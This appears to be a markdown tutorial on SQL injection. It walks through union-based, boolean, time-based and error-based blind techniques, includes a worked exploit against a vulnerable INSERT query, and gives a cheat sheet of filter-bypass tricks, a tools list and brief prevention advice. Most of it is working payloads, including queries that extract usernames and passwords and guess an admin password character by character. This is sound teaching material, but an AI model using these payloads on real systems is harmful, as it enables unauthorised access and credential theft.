# sqli
## 1.what is sql injection ?

A SQL injection attack consists of inserting or “injecting” SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input .
### SQL injection examples
There are lots of SQL injection vulnerabilities, attacks, and techniques, that occur in different situations. Some common SQL injection examples include:

Retrieving hidden data, where you can modify a SQL query to return additional results.
Subverting application logic, where you can change a query to interfere with the application's logic.
UNION attacks, where you can retrieve data from different database tables.
Blind SQL injection, where the results of a query you control are not returned in the application's responses.
Subverting application logic,where you can bypass logins for example.
### How to detect SQL injection vulnerabilities
Detecting the entry point in SQL injection (SQLi) involves identifying locations in an application where user input is not properly sanitized before it is included in SQL queries.
Exploitation requires identifying the method to escape from the current context effectively.

1. Error Messages: Inputting special characters (e.g., a single quote ') into input fields might trigger SQL errors. If the application displays detailed error messages, it can indicate a potential SQL injection point and information about the DBMS.

-Simple characters: ', ", ;, ) and *
-Simple characters encoded: %27, %22, %23, %3B, %29 and %2A
-Multiple encoding: %%2727, %25%27
-Comments 
2. Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value wh
3. Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
## 2. sql injection attacks

### 2.1 SQL Injection – Basic Concepts
vulnerable query
```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password';
``` 
why is this vulnerable?

User input is directly inserted into the SQL querie, the attacker can inject sql commands into the username and password variables.
how to exploit?
we can write sql code in our payload that will be executed in the database 
this will allow us to bypass authorization

### 2.2 union based sqli
how can we retrieve something located in another table?
In SQL, UNION combines the results of two or more SELECT statements into a single result set.
Requirements for UNION:

-Both queries must return the same number of columns.
-The data types of corresponding columns must be compatible.
how to perform the union based sqli?

Let's assume a vulnerable web application retrieves product details based on a product ID from a database:
```sql
SELECT * FROM items WHERE id = '${itemId}' and preRelease = false;
```
1. Determine the Number of Columns
there are two ways to do this:
m1. use the order by :
```sql
' ORDER BY 1--   -- No error? At least 1 column
' ORDER BY 2--   -- No error? At least 2 columns
...
' ORDER BY N--   -- Error occurs at N => Total columns = N-1
```
in our example the first 4 tests won't return any error, but the 5th will return an error.
we conclude that there are exactly 4 columns.
m2.use UNION SELECT:
```sql
' UNION SELECT NULL--        
' UNION SELECT NULL,NULL--   
' UNION SELECT NULL,NULL,NULL--  
```
since the number of columns must be the same for both queries, we will get errors until the number of columns (the number of 'NULL's) matches the one of the other query.
here , ' UNION SELECT NULL,NULL,NULL,NULL--   will work ,so 4 columns .
2. Identify Usable Columns
we substitute the NULLs with a string, for example:
```sql
' UNION SELECT 'a',NULL,NULL,NULL--  -- Test column 1
' UNION SELECT NULL,'a',NULL,NULL--  -- Test column 2
' UNION SELECT NULL,NULL,'a',NULL--  -- Test column 3
' UNION SELECT NULL,NULL,NULL,'a'--  -- Test column 4
```
Success (no error + string appears): The tested column accepts strings and can be used to extract data.

Error (e.g., type conversion failure): The column does not accept strings.

3. Extract Database Metadata
retrieve the table name from the database
```sql
' union SELECT table_name,NULL FROM information_schema.tables ;
```
retrieve column names from the table
```sql
' union SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'table_name' ;           
```
4. Extract Data
now we can extract the data from the table by using the column number

let's assume The original query returns two columns, both of which can hold string data.
the payload will be:
```sql
' UNION SELECT username, password FROM users--
```
this will allow us to extract the username and password from the users table.
however our example takes 4 columns, so the payload will be 
```sql
' UNION SELECT null, username, NULL, password FROM users--
```
<!-- period 1 -->
## 3 blind sql injection
what can we do when there is no shown output from the query?
essentially, with any form of binary (boolean) response from the website (ie the database) we can extract whatever we need
its like a guessing game we play with the website 
that allows us to guess anything with bruteforcing character by character 
the boolean response we can get from the website is usually in 3 forms
-a literal boolean response , like checking if an item exists in stock
-an error,either an error occurs or our request is successful
-response time, either an immediate response or a delayed one 
we usually use the substring function for our bruteforce :
```sql
SUBSTRING(string, start_position, length)
```
-string → The text or column to extract from.
-start_position → Where to begin extraction (1 = first character).
-length → How many characters to extract.
### 3.0 boolean based sql injecion
Boolean Based Injection attacks rely on sending an SQL query to the database, making the application return a different result depending on whether the query returns TRUE or FALSE. The attacker can infer information based on differences in the behavior of the application.
#### Mechanism
1. Conditional Queries:

We injects SQL conditions (e.g., AND 1=1, OR (SELECT ...)=1).
Example: ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --.
If true, the application behaves normally (e.g., loads content); if false, it behaves differently (e.g., shows an error).
2. Binary Inference:
Each query tests a single condition (e.g., "Is the first character of the admin's password 'a'?").
Observing differences in responses (e.g., HTTP status codes, page content, load times) allows us to guess answers.
3. Iterative Process:
we systematically test characters/bytes (e.g., using SUBSTRING() or ASCII() functions).


#### basic example
let's imagine a search query for an item in a shop
```sql
SELECT * FROM items WHERE name = 'pen';
```
if the shop has pens it returns "item is in stock", for example
if not it returns "Item not found or out of stock", again hypothetically
let's suppose the shop has pens it returns "item is in stock", we we search for them
here is the structure of the sqli we can use 
```sql
pen' and 1=2 -- 
```
true and false = false so it will output item not found
however 
```sql
pen' and 1=1 --
```
will return item found 

we can take advantage of this boolean output to guess the password for the admin user,for example,with this payload
```sql
pen' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --
```
the query then becomes
```sql
SELECT * FROM items WHERE name = 'pen' 
  AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' -- ';
```
if the first character is a it returns item is in stock ,if not it outputs item is not in stock

### 3.1 time-based sql injection
Time-based SQL Injection is a type of blind SQL Injection attack that relies on database delays to infer whether certain queries return true or false.
It is used when an application does not display any direct feedback from the database queries but allows execution of time-delayed SQL commands. 
The attacker can analyze the time it takes for the database to respond to indirectly gather information from the database.
the payload for our previous example will be something like:
pen' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')= '5', sleep(5), 0) --
this will allow us guess the first character of the field by monitoring response time of the website ,we can automate the process with burpsuite's intruder or with an automated script
however,the sleep function could be filtered or there is a short timeout for the response wich would make it difficult if not inpossible to perform a time based exploitation
what else can we do?
### 3.2 error-based sql injection
another blind exploitation is error-based sql injection, which is based on the fact that the application will return an error message when the query is invalid.
same as time-based sql injection,we can guess the first character of the field by monitoring response time of the website ,we can automate the process with burpsuite's intruder or with an automated script

Examples:
- undefined values (like 1/0)

```sql
   select if(1=1, 1, 1/0) -- OK
   select if(1=2, 1, 1/0) -- error
```

- Using json() function in SQLite to trigger an error as an oracle to know when the injection is true or false.

```sql
' AND CASE WHEN 1=1 THEN 1 ELSE json('') END AND 'A'='A -- OK
' AND CASE WHEN 1=2 THEN 1 ELSE json('') END AND 'A'='A -- malformed JSON
```
the payload for our previous example will be something like:
pen' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')= '5', 1/0, 0) --
NB:make sure the error is a database error not an error from another unrelated functionality in the web app
### an error / time based example
we are now interested in the review functionality
examining the code of the review api we find a vulnerbale query responsible for submitting a review in he database

```js
 const query = `INSERT INTO reviews (product_id, rating) 
VALUES ('${productId}', ${rating})`;
```

the develepor thought that an insert query cant be exploited so he didnt care,but is it really unexploitable? 
since the rating have to be a nulber between 1 and 5,we will use the productId for our exploit since it doesnt have any constraints
to complete the query successfully the payload should be something like :
```sql
',2)-- -
```
the "2" represents the "rating field" as it has to be specified and we have to close the values () with a ")" and comment the rest of the code 
the payload we are going to use 
```sql
' , (SELECT IF(SUBSTRING(password,1,1)='a', 1, 1/0) FROM users WHERE username='admin')) -- -
```
# SQL Filter Bypass Techniques

---

## 1. White Space Manipulation
- **Basic Bypass**:  
  `?id=1/*comment*/AND/**/1=1/**/--`  
  `?id=1%09AND%0A1=1%20--` (URL-encoded whitespace: `%09`, `%0A`, `%20`)  
- **Conditional Comments**:  
  `?id=1/*!12345UNION*//*!12345SELECT*/1--`  
- **Parentheses**:  
  `?id=(1)and(1)=(1)--`

---

## 2. Function/Operator Substitution
| **Standard**          | **Bypass**                      |
|-------------------------|----------------------------------|
| `SUBSTR('SQL',1,1)`     | `SUBSTR('SQL' FROM 1 FOR 1)`     |
| `=`                     | `LIKE`, `REGEXP`, `BETWEEN`      |
| `>`                     | `NOT BETWEEN 0 AND X`            |
| `WHERE`                 | `HAVING`                         |
| `AND`                   | `&&`                             |
| `OR`                    | `||`                             |
| `SELECT`                | `EXEC`, `VALUES` (context-based) |

---

## 3. Case Manipulation
| **Keyword** | **Bypass Variations** |
|-------------|------------------------|
| `AND`       | `AnD`, `aNd`, `&&`     |
| `UNION`     | `uNioN`, `UnIoN`       |
| `SELECT`    | `sEleCt`, `seLECT`     |

---

## 4. Encoding Techniques
- **Hex Encoding**:  
  `SELECT` → `0x53454C454354`  
- **URL Encoding**:  
  `UNION` → `%55%4E%49%4F%4E`  
- **CHAR() Function**:  
  `SELECT` → `CHAR(83,69,76,69,67,84)`  

---

## 5. Advanced Bypass
| **Forbidden** | **Replacement**                   |
|---------------|------------------------------------|
| `IN`          | `NOT IN`, `BETWEEN`               |
| `!=`          | `<>`, `NOT LIKE`                  |
| `--`          | `#`, `/*! */` (MySQL-specific)    |
| `,`           | `JOIN` (for column/table bypass)  |

## 5. sql injection tools
there are several tools that can be used to perform sql injection attacks,the most communly used one (because it's the best) is:
- sqlmap
available on https://github.com/sqlmapproject/sqlmap

1. other tools:
-Burp Suite
-OWASP ZAP
-Atlas , WAF bypass suggester tool
Quick SQLMap Tamper Suggester v1.0
https://github.com/m4ll0k/Atlas
2. tools i didn't use
-Acunetix
-Nessus
Nessus is a commercial vulnerability scanner that includes a SQL injection scanner.
-Vega
-Arachni
-skipfish
-w3af
-Netsparker


## 6. sql injection prevention techniques

there are several techniques that can be used to prevent sql injection, including:

- using parameterized queries or prepared statements
- validating and sanitizing user input
- using stored procedures or functions
- using database access control (dac) mechanisms
- using database transactions


Other Guides

https://sqlwiki.netspi.com/
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
https://github.com/HackTricks-wiki/hacktricks/tree/master/src/pentesting-web/sql-injection
